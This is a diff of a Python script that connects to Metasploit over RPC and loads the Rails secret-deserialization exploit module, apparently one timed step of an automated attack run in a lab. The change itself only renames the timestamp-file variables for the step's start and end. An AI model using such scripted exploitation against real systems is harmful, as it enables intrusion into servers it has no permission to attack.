@@ -21,8 +21,8 @@ def main(argv):
     client = MsfRpcClient('kali')
     
     # start step 3
-    output_time_file = 'time_step_3_start.txt'
-    record_timestamp(folder, output_time_file)
+    output_time_file_start = 'time_step_3_start.txt'
+    record_timestamp(folder, output_time_file_start)
     time.sleep(2)
 
     exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
@@ -48,8 +48,8 @@ def main(argv):
         time.sleep(1)
 
     time.sleep(30)
-    output_time_file = 'time_step_3_end.txt'
-    record_timestamp(folder, output_time_file)
+    output_time_file_end = 'time_step_3_end.txt'
+    record_timestamp(folder, output_time_file_end)
     time.sleep(30)
 
 main(sys.argv)
